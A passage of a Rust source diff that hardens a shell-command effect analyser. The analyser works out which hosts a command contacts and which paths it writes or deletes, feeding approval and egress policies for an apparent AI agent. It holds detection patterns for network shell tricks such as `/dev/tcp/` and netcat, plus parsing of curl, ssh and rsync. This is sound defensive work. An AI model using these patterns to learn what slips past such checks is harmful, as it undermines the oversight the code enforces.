@@ -1089,28 +1089,66 @@ fn push_with_wrappers(mut tokens: Vec<String>, depth: usize, out: &mut Vec<Vec<S
 // ---------------------------------------------------------------------------
 //
 // What a call does, for the kernel's decline memory and the approval and
-// egress policies. Keys are built only with the kernel constructors. A
-// command is `complete` only when every segment is fully understood: a known
-// observation, or a program from the tables below in a shape whose every
-// option is known. Anything else (scripts, interpreters, wrappers, unknown
-// options, shell expansion) leaves the declared keys as a lower bound.
+// egress policies. Keys are built only with the kernel constructors.
+//
+// Completeness is earned, never assumed. A shell command is `complete` only
+// when EVERY segment matches a grammar modelled here in full:
+// - a known observation, or a program from the tables below, in a shape
+//   where every option is listed with its arity (a flag or one value);
+// - every word plain: no unquoted brace, glob, `$`, backtick, backslash or
+//   `~user`, and no expansion inside double quotes;
+// - every URL strict (`scheme://[userinfo@]host[:port][/path][?q][#f]`,
+//   ASCII, one `@` at most, a DNS name or IP literal for host, no curl glob
+//   characters), every bare host a DNS name or IP literal;
+// - every path resolvable physically (see `shell_path_effects`), with no
+//   `cd`, `pushd` or `popd` anywhere in the command.
+// Anything else (scripts, interpreters, wrappers, unknown options, proxies,
+// scheme-less URLs, git commands that run hooks) makes the call incomplete;
+// keys found are kept as a lower bound. An incomplete call costs one owner
+// card after a decline; a wrong `complete` lets a declined effect through,
+// so when in doubt the parser says incomplete.
+//
 // Configuration files a program reads on its own (`~/.curlrc`,
-// `~/.ssh/config` host aliases, git `insteadOf` rewrites) are not consulted.
+// `~/.ssh/config` host aliases, git `insteadOf` rewrites) are an accepted
+// residual. Redirects a server returns are re-validated per hop by the
+// destination policy, not declared here.
 
 /// An egress effect on `host`, with IPv6 brackets stripped so `[::1]` and
 /// `::1` name one host. `None` for an empty or unreadable host.
 pub(crate) fn egress_effect(scheme: &str, host: &str, port: Option<u16>) -> Option<EffectKey> {
     let host = host.trim();
-    let host = host
-        .strip_prefix('[')
-        .and_then(|inner| inner.strip_suffix(']'))
-        .unwrap_or(host);
-    if host.is_empty()
-        || host.contains(|c: char| c.is_whitespace() || matches!(c, '/' | '@' | '$' | '`'))
-    {
+    let bare = match host.strip_prefix('[') {
+        // A bracketed host is an IPv6 literal and nothing else.
+        Some(inner) => {
+            let inner = inner.strip_suffix(']')?;
+            inner.parse::<std::net::Ipv6Addr>().ok()?;
+            inner
+        }
+        None => host,
+    };
+    if !valid_host(bare) {
         return None;
     }
-    Some(EffectKey::egress(scheme, host, port))
+    Some(EffectKey::egress(scheme, bare, port))
+}
+
+/// A DNS name (ASCII letters, digits and inner hyphens per label; a trailing
+/// dot allowed) or an IPv4 or IPv6 literal. Rejects every character a shell
+/// or curl could expand (`{ } * ? [ ] ,`).
+fn valid_host(host: &str) -> bool {
+    if host.parse::<std::net::Ipv4Addr>().is_ok() || host.parse::<std::net::Ipv6Addr>().is_ok() {
+        return true;
+    }
+    let name = host.strip_suffix('.').unwrap_or(host);
+    !name.is_empty()
+        && name.len() <= 253
+        && name.split('.').all(|label| {
+            !label.is_empty()
+                && label.len() <= 63
+                && !label.starts_with('-')
+                && !label.ends_with('-')
+                && label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+        })
 }
 
 /// Default ports the kernel's egress constructor does not know.
@@ -1123,21 +1161,71 @@ fn scheme_default_port(scheme: &str) -> Option<u16> {
     }
 }
 
-/// The egress effect of a URL, read as `default_scheme` when it names no
-/// scheme. `None` when it has no network host or cannot be read
-/// structurally (shell expansion, unparsable).
-pub(crate) fn url_effect(raw: &str, default_scheme: &str) -> Option<EffectKey> {
-    let raw = raw.trim();
-    if raw.is_empty() || raw.contains(['$', '`']) {
+/// The egress effect of a URL in its strict form
+/// (`scheme://[userinfo@]host[:port][/path][?query][#fragment]`). `None` for
+/// anything else: no scheme (programs guess one), non-ASCII, whitespace,
+/// control characters, `\\`, quotes, shell expansion, more than one `@` in
+/// the authority, a host that is not a DNS name or IP literal, a bad port,
+/// or curl glob characters (`{ } [ ] * ,`) outside an IPv6 host literal. The
+/// host must also be the one the URL crate reads, so a program's parser and
+/// ours cannot disagree.
+pub(crate) fn url_effect(raw: &str) -> Option<EffectKey> {
+    let url = strict_url(raw)?;
+    url_host_effect(&url)
+}
+
+fn strict_url(raw: &str) -> Option<reqwest::Url> {
+    if raw.is_empty()
+        || !raw.is_ascii()
+        || raw.chars().any(|c| {
+            c.is_ascii_whitespace()
+                || c.is_ascii_control()
+                || matches!(c, '\\' | '$' | '`' | '"' | '\'' | '{' | '}' | '*' | ',')
+        })
+    {
         return None;
     }
-    let text = if raw.contains("://") {
-        raw.to_string()
-    } else {
-        format!("{default_scheme}://{raw}")
+    let (scheme, rest) = raw.split_once("://")?;
+    let mut scheme_chars = scheme.chars();
+    if !scheme_chars.next()?.is_ascii_alphabetic()
+        || !scheme_chars.all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
+    {
+        return None;
+    }
+    let authority_end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
+    let (authority, tail) = rest.split_at(authority_end);
+    // Brackets belong only to an IPv6 host literal.
+    if tail.contains(['[', ']']) || authority.matches('@').count() > 1 {
+        return None;
+    }
+    let host_port = authority
+        .rsplit_once('@')
+        .map_or(authority, |(_, host)| host);
+    let (host, port) = match host_port.strip_prefix('[') {
+        Some(after) => {
+            let (inner, port) = after.split_once(']')?;
+            (format!("[{inner}]"), port)
+        }
+        None => match host_port.split_once(':') {
+            Some((host, _)) => (host.to_string(), &host_port[host.len()..]),
+            None => (host_port.to_string(), ""),
+        },
     };
-    let url = reqwest::Url::parse(&text).ok()?;
-    url_host_effect(&url)
+    if host.contains(['[', ']']) && !host.starts_with('[') {
+        return None;
+    }
+    if let Some(digits) = port.strip_prefix(':') {
+        if digits.is_empty() || digits.len() > 5 || !digits.chars().all(|c| c.is_ascii_digit()) {
+            return None;
+        }
+        digits.parse::<u16>().ok()?;
+    } else if !port.is_empty() {
+        return None;
+    }
+    egress_effect(scheme, &host, None)?;
+    let url = reqwest::Url::parse(raw).ok()?;
+    let normalize = |host: &str| host.trim_end_matches('.').to_ascii_lowercase();
+    (normalize(url.host_str()?) == normalize(&host)).then_some(url)
 }
 
 /// The egress effect of a parsed URL: its host and its explicit port, else
@@ -1205,6 +1293,67 @@ fn resolved_on_disk(class: EffectClass, lexical: EffectKey) -> EffectKey {
             .unwrap_or(lexical);
     }
     lexical
+}
+
+/// A path operand of a shell command, resolved the way the OS resolves it:
+/// the longest existing prefix of the RAW path (`..` not folded first, so
+/// `link/..` is the link target's parent) is canonicalized, then the rest is
+/// appended. A `Delete` also declares the entry as named (its parent
+/// canonicalized, its last component kept), so both a symlink and, through a
+/// trailing `/`, its target are covered. `None` when the path cannot be read
+/// (shell expansion, relative with no working directory), when an existing
+/// prefix cannot be canonicalized (a dangling symlink), or when `..` follows
+/// a component that does not exist.
+pub(crate) fn shell_path_effects(
+    class: EffectClass,
+    raw: &str,
+    cwd: Option<&str>,
+) -> Option<Vec<EffectKey>> {
+    let raw = raw.trim();
+    if raw.is_empty() || raw.contains(['$', '`', '*', '?', '[', ']', '{', '}', '\\', '\0']) {
+        return None;
+    }
+    let expanded = if raw == "~" || raw.starts_with("~/") {
+        format!("{}{}", dirs::home_dir()?.to_str()?, &raw[1..])
+    } else if raw.starts_with('~') {
+        return None;
+    } else {
+        raw.to_string()
+    };
+    let absolute = if expanded.starts_with('/') {
+        expanded
+    } else {
+        let cwd = cwd.map(str::trim).filter(|cwd| cwd.starts_with('/'))?;
+        format!("{}/{expanded}", cwd.trim_end_matches('/'))
+    };
+    let components: Vec<&str> = absolute
+        .split('/')
+        .filter(|part| !part.is_empty() && *part != ".")
+        .collect();
+    let mut existing = components.len();
+    let base = loop {
+        let prefix = format!("/{}", components[..existing].join("/"));
+        if std::fs::symlink_metadata(&prefix).is_ok() {
+            break std::fs::canonicalize(&prefix).ok()?;
+        }
+        existing -= 1;
+    };
+    let rest = &components[existing..];
+    if rest.contains(&"..") {
+        return None;
+    }
+    let mut physical = base;
+    for part in rest {
+        physical.push(part);
+    }
+    let mut keys = vec![EffectKey::path(class, physical.to_str()?)?];
+    if class == EffectClass::Delete {
+        let named = path_effect(class, raw, cwd)?;
+        if !keys.contains(&named) {
+            keys.push(named);
+        }
+    }
+    Some(keys)
 }
 
 /// Whether the active execution backend is this machine, so paths resolve on
@@ -1317,8 +1466,8 @@ impl ShellAnalysis {
             self.unresolved();
             return;
         }
-        match path_effect(class, raw, cwd) {
-            Some(key) => self.add(key),
+        match shell_path_effects(class, raw, cwd) {
+            Some(keys) => keys.into_iter().for_each(|key| self.add(key)),
             None => self.unresolved(),
         }
     }
@@ -1340,8 +1489,15 @@ fn analyze_shell(command: &str, cwd: Option<&str>) -> ShellAnalysis {
     if command.contains("/dev/tcp/") || command.contains("/dev/udp/") || command.contains("$'") {
         out.opaque();
     }
-    // A `cd` moves where later relative paths resolve.
-    let mut cwd = cwd.map(str::to_string);
+    // A `cd` anywhere moves where relative paths resolve, and a redirect is
+    // applied before its own segment runs: no relative path is known.
+    let changes_directory = expanded_commands(command)
+        .iter()
+        .any(|tokens| matches!(basename(&tokens[0]), "cd" | "pushd" | "popd"));
+    if changes_directory {
+        out.unresolved();
+    }
+    let cwd = cwd.filter(|_| !changes_directory);
     for line in command.replace("\\\n", " ").split('\n') {
         let scanned = scan(line);
         // Substitutions, groupings, heredocs and comments hide commands.
@@ -1352,24 +1508,65 @@ fn analyze_shell(command: &str, cwd: Option<&str>) -> ShellAnalysis {
             if target.contains(['"', '\'']) {
                 out.unresolved();
             } else {
-                out.path(EffectClass::Write, target, cwd.as_deref());
+                out.path(EffectClass::Write, target, cwd);
             }
         }
         for segment in &scanned.segments {
             if segment.trim().is_empty() {
                 continue;
             }
+            if has_expansion(segment) {
+                out.opaque();
+            }
             let Ok(tokens) = shell_words::split(segment) else {
                 out.opaque();
                 continue;
             };
-            segment_effects(&strip_redirections(tokens), &mut cwd, &mut out);
+            segment_effects(&strip_redirections(tokens), cwd, &mut out);
         }
     }
     out
 }
 
-fn segment_effects(tokens: &[String], cwd: &mut Option<String>, out: &mut ShellAnalysis) {
+/// Whether the shell would expand anything in `segment`: an unquoted brace,
+/// glob, `$`, backtick, backslash or `~user`, or a `$`, backtick or
+/// backslash inside double quotes. Single quotes are literal.
+fn has_expansion(segment: &str) -> bool {
+    let chars: Vec<char> = segment.chars().collect();
+    let (mut in_single, mut in_double) = (false, false);
+    for (index, &c) in chars.iter().enumerate() {
+        if in_single {
+            in_single = c != '\'';
+            continue;
+        }
+        if in_double {
+            match c {
+                '"' => in_double = false,
+                '$' | '`' | '\\' => return true,
+                _ => {}
+            }
+            continue;
+        }
+        match c {
+            '\'' => in_single = true,
+            '"' => in_double = true,
+            '{' | '}' | '*' | '?' | '[' | ']' | '$' | '`' | '\\' => return true,
+            '~' => {
+                let word_start = index == 0 || chars[index - 1].is_whitespace();
+                let user = chars
+                    .get(index + 1)
+                    .is_some_and(|next| !next.is_whitespace() && *next != '/');
+                if word_start && user {
+                    return true;
+                }
+            }
+            _ => {}
+        }
+    }
+    false
+}
+
+fn segment_effects(tokens: &[String], here: Option<&str>, out: &mut ShellAnalysis) {
     let Some(program) = tokens.first() else {
         return;
     };
@@ -1386,11 +1583,16 @@ fn segment_effects(tokens: &[String], cwd: &mut Option<String>, out: &mut ShellA
     if OBSERVATION_PROGRAMS.contains(&name) && observation_args_ok(name, args) {
         return;
     }
-    let cwd_now = cwd.clone();
-    let here = cwd_now.as_deref();
     match name {
-        "cd" | "pushd" | "popd" => *cwd = None,
-        "rm" | "rmdir" | "unlink" => deleted(tokens, here, out),
+        // Already made the whole call incomplete.
+        "cd" | "pushd" | "popd" => {}
+        "rm" | "rmdir" | "unlink" => {
+            if parse_options(&REMOVE, args).is_some() {
+                deleted(tokens, here, out)
+            } else {
+                out.unresolved()
+            }
+        }
         "find"
             if args.iter().any(|arg| arg == "-delete")
                 && !args
@@ -1403,7 +1605,7 @@ fn segment_effects(tokens: &[String], cwd: &mut Option<String>, out: &mut ShellA
         "tee" | "touch" | "mkdir" => created(name, args, here, out),
         "curl" => curl(args, here, out),
         "wget" => wget(args, here, out),
-        "http" | "https" | "xh" | "xhs" => httpie(name, args, here, out),
+        "http" | "https" | "xh" | "xhs" => httpie(args, here, out),
         "nc" | "ncat" | "netcat" => netcat(args, out),
         "ssh" => ssh(args, here, out),
         "scp" => scp(args, here, out),
@@ -1412,6 +1614,26 @@ fn segment_effects(tokens: &[String], cwd: &mut Option<String>, out: &mut ShellA
         _ => out.opaque(),
     }
 }
+
+const REMOVE: OptionSpec = OptionSpec {
+    flags: "rRfidIvP",
+    valued: &[],
+    long_flags: &[
+        "recursive",
+        "force",
+        "dir",
+        "verbose",
+        "interactive",
+        "one-file-system",
+        "preserve-root",
+        "ignore-fail-on-non-empty",
+        "parents",
+    ],
+    long_valued: &[],
+    long_equals: false,
+    exact: &[],
+    stop_at_positional: false,
+};
 
 fn deleted(tokens: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
     match delete_targets(&shell_words::join(tokens)) {
@@ -1431,8 +1653,6 @@ enum OptionValue {
     Ignore,
     /// A URL the program contacts.
     Url,
-    /// A proxy the program connects through.
-    Proxy,
     /// A file the program writes (`-` is stdout).
     Write,
     /// The file a download is saved to (`-` is stdout).
@@ -1456,6 +1676,9 @@ struct OptionSpec {
     long_equals: bool,
     /// Whole words without a value (wget's `-nv`).
     exact: &'static [&'static str],
+    /// Options end at the first operand (ssh: the rest is the remote
+    /// command).
+    stop_at_positional: bool,
 }
 
 #[derive(Default)]
@@ -1474,6 +1697,7 @@ fn parse_options(spec: &OptionSpec, args: &[String]) -> Option<ParsedOptions> {
         index += 1;
         if options_done || arg == "-" || !arg.starts_with('-') {
             parsed.positionals.push(arg.clone());
+            options_done |= spec.stop_at_positional;
             continue;
         }
         if arg == "--" {
@@ -1530,21 +1754,15 @@ fn lookup(table: &[(&str, OptionValue)], name: &str) -> Option<OptionValue> {
         .map(|(_, role)| *role)
 }
 
-/// Apply the option values every program shares: written files, proxies
-/// and URLs.
-fn apply_values(
-    parsed: &ParsedOptions,
-    default_scheme: &str,
-    cwd: Option<&str>,
-    out: &mut ShellAnalysis,
-) {
+/// Apply the option values every program shares: written files and URLs.
+/// Proxies are never listed: where traffic goes through one is not modelled.
+fn apply_values(parsed: &ParsedOptions, cwd: Option<&str>, out: &mut ShellAnalysis) {
     for (role, value) in &parsed.values {
         match role {
             OptionValue::Write | OptionValue::Document if value != "-" => {
                 out.path(EffectClass::Write, value, cwd)
             }
-            OptionValue::Url => out.egress(url_effect(value, default_scheme)),
-            OptionValue::Proxy => out.egress(url_effect(value, "http")),
+            OptionValue::Url => out.egress(url_effect(value)),
             _ => {}
         }
     }
@@ -1571,7 +1789,6 @@ const CURL: OptionSpec = OptionSpec {
         ('z', OptionValue::Ignore),
         ('E', OptionValue::Ignore),
         ('U', OptionValue::Ignore),
-        ('x', OptionValue::Proxy),
         ('o', OptionValue::Write),
         ('D', OptionValue::Write),
         ('c', OptionValue::Write),
@@ -1663,8 +1880,6 @@ const CURL: OptionSpec = OptionSpec {
         ("continue-at", OptionValue::Ignore),
         ("time-cond", OptionValue::Ignore),
         ("proxy-user", OptionValue::Ignore),
-        ("proxy", OptionValue::Proxy),
-        ("preproxy", OptionValue::Proxy),
         ("output", OptionValue::Write),
         ("dump-header", OptionValue::Write),
         ("cookie-jar", OptionValue::Write),
@@ -1676,6 +1891,7 @@ const CURL: OptionSpec = OptionSpec {
     ],
     long_equals: false,
     exact: &[],
+    stop_at_positional: false,
 };
 
 fn curl(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
@@ -1691,9 +1907,9 @@ fn curl(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
     {
         out.unresolved();
     }
-    apply_values(&parsed, "http", cwd, out);
+    apply_values(&parsed, cwd, out);
     for url in &parsed.positionals {
-        out.egress(url_effect(url, "http"));
+        out.egress(url_effect(url));
     }
 }
 
@@ -1758,6 +1974,7 @@ const WGET: OptionSpec = OptionSpec {
     ],
     long_equals: true,
     exact: &["-nv", "-nc", "-nd", "-nH"],
+    stop_at_positional: false,
 };
 
 fn wget(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
@@ -1765,9 +1982,9 @@ fn wget(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
         out.opaque();
         return;
     };
-    apply_values(&parsed, "http", cwd, out);
+    apply_values(&parsed, cwd, out);
     for url in &parsed.positionals {
-        out.egress(url_effect(url, "http"));
+        out.egress(url_effect(url));
     }
     // Without `-O` wget saves under a name taken from the URL or response.
     let names_output = parsed
@@ -1818,16 +2035,18 @@ const HTTPIE: OptionSpec = OptionSpec {
     ],
     long_equals: true,
     exact: &[],
+    stop_at_positional: false,
 };
 
-/// HTTPie (`http`, `https`) and xh: `[METHOD] URL [items]`, where a URL
-/// may be `:port/path` for localhost and names no scheme by default.
-fn httpie(program: &str, args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
+/// HTTPie (`http`, `https`) and xh: `[METHOD] URL [items]`. Only a strict
+/// URL is read; the `:port/path` localhost shorthand and scheme-less hosts
+/// are guesses the program makes.
+fn httpie(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
     let Some(parsed) = parse_options(&HTTPIE, args) else {
         out.opaque();
         return;
     };
-    apply_values(&parsed, "http", cwd, out);
+    apply_values(&parsed, cwd, out);
     let mut positionals = parsed.positionals.iter();
     let mut url = positionals.next();
     if url.is_some_and(|word| !word.is_empty() && word.chars().all(|c| c.is_ascii_uppercase())) {
@@ -1837,16 +2056,7 @@ fn httpie(program: &str, args: &[String], cwd: Option<&str>, out: &mut ShellAnal
         out.opaque();
         return;
     };
-    let scheme = if matches!(program, "https" | "xhs") {
-        "https"
-    } else {
-        "http"
-    };
-    let url = match url.strip_prefix(':') {
-        Some(rest) => format!("localhost:{rest}"),
-        None => url.clone(),
-    };
-    out.egress(url_effect(&url, scheme));
+    out.egress(url_effect(url));
 }
 
 const NETCAT: OptionSpec = OptionSpec {
@@ -1862,6 +2072,7 @@ const NETCAT: OptionSpec = OptionSpec {
     long_valued: &[],
     long_equals: false,
     exact: &[],
+    stop_at_positional: false,
 };
 
 /// `nc host port`. Listening, proxies and `-e` are not understood.
@@ -1892,6 +2103,7 @@ const SSH: OptionSpec = OptionSpec {
     long_valued: &[],
     long_equals: false,
     exact: &[],
+    stop_at_positional: true,
 };
 
 fn port_option(parsed: &ParsedOptions) -> Result<Option<u16>, ()> {
@@ -1908,6 +2120,9 @@ fn port_option(parsed: &ParsedOptions) -> Result<Option<u16>, ()> {
 
 /// `user@host` or `host` (brackets allowed for IPv6) as an ssh egress.
 fn ssh_host_effect(destination: &str, port: Option<u16>) -> Option<EffectKey> {
+    if destination.matches('@').count() > 1 {
+        return None;
+    }
     let host = destination
         .rsplit_once('@')
         .map_or(destination, |(_, host)| host);
@@ -1921,14 +2136,14 @@ fn ssh(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
         out.opaque();
         return;
     };
-    apply_values(&parsed, "ssh", cwd, out);
+    apply_values(&parsed, cwd, out);
     let Ok(port) = port_option(&parsed) else {
         out.opaque();
         return;
     };
     let key = parsed.positionals.first().and_then(|destination| {
         if destination.contains("://") {
-            let url = reqwest::Url::parse(destination).ok()?;
+            let url = strict_url(destination)?;
             if url.scheme() != "ssh" {
                 return None;
             }
@@ -1945,7 +2160,7 @@ fn ssh(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
 /// `Err` when it cannot be read.
 fn remote_operand(operand: &str, scheme: &str, port: Option<u16>) -> Result<Option<EffectKey>, ()> {
     if operand.contains("://") {
-        return url_effect(operand, scheme).map(Some).ok_or(());
+        return url_effect(operand).map(Some).ok_or(());
     }
     if operand.starts_with(['/', '.', '~']) {
         return Ok(None);
@@ -2029,6 +2244,7 @@ const SCP: OptionSpec = OptionSpec {
     long_valued: &[],
     long_equals: false,
     exact: &[],
+    stop_at_positional: false,
 };
 
 fn scp(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
@@ -2044,8 +2260,8 @@ fn scp(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
 }
 
 const RSYNC: OptionSpec = OptionSpec {
-    flags: "avzrlptgoDhPnciuqHAXSWxRbIKLkmyO",
-    valued: &[('T', OptionValue::Ignore), ('B', OptionValue::Ignore)],
+    flags: "avzrlptgoDhPnciuqHAXSWxRIKLkmyO",
+    valued: &[('B', OptionValue::Ignore)],
     long_flags: &[
         "archive",
         "verbose",
@@ -2072,7 +2288,6 @@ const RSYNC: OptionSpec = OptionSpec {
         "whole-file",
         "one-file-system",
         "relative",
-        "backup",
         "ignore-existing",
         "inplace",
         "append",
@@ -2104,16 +2319,11 @@ const RSYNC: OptionSpec = OptionSpec {
         ("chmod", OptionValue::Ignore),
         ("max-size", OptionValue::Ignore),
         ("min-size", OptionValue::Ignore),
-        ("temp-dir", OptionValue::Ignore),
-        ("partial-dir", OptionValue::Ignore),
-        ("backup-dir", OptionValue::Ignore),
-        ("suffix", OptionValue::Ignore),
         ("password-file", OptionValue::Ignore),
-        ("port", OptionValue::Port),
-        ("log-file", OptionValue::Write),
     ],
     long_equals: true,
     exact: &[],
+    stop_at_positional: false,
 };
 
 fn rsync(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
@@ -2121,11 +2331,8 @@ fn rsync(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
         out.opaque();
         return;
     };
-    apply_values(&parsed, "rsync", cwd, out);
-    let Ok(port) = port_option(&parsed) else {
-        out.opaque();
-        return;
-    };
+    // rsync's own `--port` is not listed: it applies to one transport only.
+    let port = None;
     let Some(local_destination) = transfer(&parsed.positionals, "rsync", port, cwd, out) else {
         return;
     };
@@ -2149,8 +2356,8 @@ fn rsync(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
 }
 
 const COPY: OptionSpec = OptionSpec {
-    flags: "rRfinpavLPHlsuxXTcbdD",
-    valued: &[('t', OptionValue::TargetDir), ('S', OptionValue::Ignore)],
+    flags: "rRfinpavLPHlsuxXTcdD",
+    valued: &[('t', OptionValue::TargetDir)],
     long_flags: &[
         "archive",
         "recursive",
@@ -2167,7 +2374,6 @@ const COPY: OptionSpec = OptionSpec {
         "link",
         "symbolic-link",
         "preserve",
-        "backup",
         "reflink",
         "strip-trailing-slashes",
     ],
@@ -2175,14 +2381,13 @@ const COPY: OptionSpec = OptionSpec {
         ("target-directory", OptionValue::TargetDir),
         ("preserve", OptionValue::Ignore),
         ("no-preserve", OptionValue::Ignore),
-        ("backup", OptionValue::Ignore),
-        ("suffix", OptionValue::Ignore),
         ("sparse", OptionValue::Ignore),
         ("reflink", OptionValue::Ignore),
         ("update", OptionValue::Ignore),
     ],
     long_equals: true,
     exact: &[],
+    stop_at_positional: false,
 };
 
 /// `cp`/`mv`: the destination (the last operand, or `-t DIR`) is written;
@@ -2240,6 +2445,7 @@ const CREATE: OptionSpec = OptionSpec {
     ],
     long_equals: true,
     exact: &[],
+    stop_at_positional: false,
 };
 
 /// `tee`, `touch` and `mkdir` write each operand.
@@ -2266,13 +2472,58 @@ fn created(program: &str, args: &[String], cwd: Option<&str>, out: &mut ShellAna
     }
 }
 
-const GIT_REMOTE: OptionSpec = OptionSpec {
-    flags: "fuqvndptrhls",
+/// Options of git's network subcommands, with their arity. They are read
+/// only to find the remote operand (a lower bound): these commands are
+/// always incomplete.
+const GIT_CLONE: OptionSpec = OptionSpec {
+    flags: "qvnls",
     valued: &[
         ('b', OptionValue::Ignore),
         ('o', OptionValue::Ignore),
         ('j', OptionValue::Ignore),
+        ('u', OptionValue::Ignore),
+        ('c', OptionValue::Ignore),
     ],
+    long_flags: &[
+        "quiet",
+        "verbose",
+        "progress",
+        "no-checkout",
+        "bare",
+        "mirror",
+        "single-branch",
+        "no-single-branch",
+        "no-tags",
+        "shallow-submodules",
+        "no-hardlinks",
+        "local",
+        "shared",
+        "sparse",
+        "recurse-submodules",
+    ],
+    long_valued: &[
+        ("branch", OptionValue::Ignore),
+        ("origin", OptionValue::Ignore),
+        ("depth", OptionValue::Ignore),
+        ("shallow-since", OptionValue::Ignore),
+        ("shallow-exclude", OptionValue::Ignore),
+        ("filter", OptionValue::Ignore),
+        ("jobs", OptionValue::Ignore),
+        ("upload-pack", OptionValue::Ignore),
+        ("template", OptionValue::Ignore),
+        ("separate-git-dir", OptionValue::Ignore),
+        ("reference", OptionValue::Ignore),
+        ("config", OptionValue::Ignore),
+        ("recurse-submodules", OptionValue::Ignore),
+    ],
+    long_equals: true,
+    exact: &[],
+    stop_at_positional: false,
+};
+
+const GIT_FETCH: OptionSpec = OptionSpec {
+    flags: "qvafkmnpPtu",
+    valued: &[('j', OptionValue::Ignore), ('o', OptionValue::Ignore)],
     long_flags: &[
         "quiet",
         "verbose",
@@ -2282,45 +2533,96 @@ const GIT_REMOTE: OptionSpec = OptionSpec {
         "no-tags",
         "prune",
         "dry-run",
-        "atomic",
-        "follow-tags",
-        "set-upstream",
-        "delete",
-        "force-with-lease",
+        "unshallow",
+        "update-head-ok",
+        "append",
+    ],
+    long_valued: &[
+        ("depth", OptionValue::Ignore),
+        ("deepen", OptionValue::Ignore),
+        ("shallow-since", OptionValue::Ignore),
+        ("shallow-exclude", OptionValue::Ignore),
+        ("jobs", OptionValue::Ignore),
+        ("upload-pack", OptionValue::Ignore),
+        ("refmap", OptionValue::Ignore),
+        ("server-option", OptionValue::Ignore),
+        ("recurse-submodules", OptionValue::Ignore),
+    ],
+    long_equals: true,
+    exact: &[],
+    stop_at_positional: false,
+};
+
+const GIT_PULL: OptionSpec = OptionSpec {
+    flags: "qvnfkr",
+    valued: &[
+        ('s', OptionValue::Ignore),
+        ('X', OptionValue::Ignore),
+        ('j', OptionValue::Ignore),
+        ('o', OptionValue::Ignore),
+    ],
+    long_flags: &[
+        "quiet",
+        "verbose",
+        "progress",
+        "force",
+        "tags",
+        "no-tags",
+        "prune",
         "rebase",
         "no-rebase",
         "ff-only",
         "ff",
         "no-ff",
         "unshallow",
-        "heads",
-        "refs",
-        "no-checkout",
-        "bare",
-        "mirror",
-        "single-branch",
-        "no-single-branch",
-        "shallow-submodules",
-        "no-hardlinks",
-        "local",
-        "shared",
-        "sparse",
+        "autostash",
+        "no-autostash",
     ],
     long_valued: &[
-        ("branch", OptionValue::Ignore),
-        ("origin", OptionValue::Ignore),
+        ("strategy", OptionValue::Ignore),
+        ("strategy-option", OptionValue::Ignore),
         ("depth", OptionValue::Ignore),
-        ("deepen", OptionValue::Ignore),
-        ("shallow-since", OptionValue::Ignore),
-        ("shallow-exclude", OptionValue::Ignore),
-        ("filter", OptionValue::Ignore),
         ("jobs", OptionValue::Ignore),
-        ("push-option", OptionValue::Ignore),
-        ("force-with-lease", OptionValue::Ignore),
         ("rebase", OptionValue::Ignore),
+        ("upload-pack", OptionValue::Ignore),
+        ("recurse-submodules", OptionValue::Ignore),
     ],
     long_equals: true,
     exact: &[],
+    stop_at_positional: false,
+};
+
+const GIT_PUSH: OptionSpec = OptionSpec {
+    flags: "qvfnud",
+    valued: &[('o', OptionValue::Ignore)],
+    long_flags: &[
+        "quiet",
+        "verbose",
+        "progress",
+        "force",
+        "tags",
+        "all",
+        "mirror",
+        "dry-run",
+        "atomic",
+        "follow-tags",
+        "set-upstream",
+        "delete",
+        "prune",
+        "force-with-lease",
+        "no-verify",
+    ],
+    long_valued: &[
+        ("push-option", OptionValue::Ignore),
+        ("force-with-lease", OptionValue::Ignore),
+        ("receive-pack", OptionValue::Ignore),
+        ("exec", OptionValue::Ignore),
+        ("repo", OptionValue::Ignore),
+        ("recurse-submodules", OptionValue::Ignore),
+    ],
+    long_equals: true,
+    exact: &[],
+    stop_at_positional: false,
 };
 
 /// A git remote given as a URL (`https://`, `ssh://`, `git://`, or
@@ -2335,7 +2637,7 @@ fn git_remote(remote: &str) -> Result<Option<EffectKey>, ()> {
         return match &remote[..scheme_end] {
             "file" => Ok(None),
             "ext" => Err(()),
-            _ => url_effect(remote, "https").map(Some).ok_or(()),
+            _ => url_effect(remote).map(Some).ok_or(()),
         };
     }
     if remote.starts_with(['/', '.', '~']) {
@@ -2349,62 +2651,49 @@ fn git_remote(remote: &str) -> Result<Option<EffectKey>, ()> {
     }
 }
 
-/// `git clone|fetch|pull|push|ls-remote` with the remote given as a URL.
-/// Any other git command that is not an observation is undeterminable
-/// (hooks, configuration, aliases).
+/// git's network commands. `ls-remote <strict URL>` with no options is
+/// complete (it only lists the remote's refs). `clone`, `fetch`, `pull` and
+/// `push` are always incomplete: they run repository hooks and may fetch
+/// submodules from other hosts. The remote's egress is still declared when
+/// it is a URL. Any other git command that is not an observation is
+/// undeterminable.
 fn git(args: &[String], cwd: Option<&str>, out: &mut ShellAnalysis) {
     let Some(subcommand) = args.first().filter(|arg| !arg.starts_with('-')) else {
         out.opaque();
         return;
     };
-    if !matches!(
-        subcommand.as_str(),
-        "clone" | "fetch" | "pull" | "push" | "ls-remote"
-    ) {
-        out.opaque();
+    let rest = &args[1..];
+    if subcommand == "ls-remote" {
+        match rest {
+            [remote] if remote.contains("://") => out.egress(url_effect(remote)),
+            _ => out.opaque(),
+        }
         return;
     }
-    let Some(parsed) = parse_options(&GIT_REMOTE, &args[1..]) else {
-        out.opaque();
-        return;
-    };
-    let Some(remote) = parsed.positionals.first() else {
-        out.opaque();
-        return;
-    };
-    match git_remote(remote) {
-        Ok(Some(key)) => out.add(key),
-        Ok(None) => {}
-        Err(()) => {
+    let spec = match subcommand.as_str() {
+        "clone" => &GIT_CLONE,
+        "fetch" => &GIT_FETCH,
+        "pull" => &GIT_PULL,
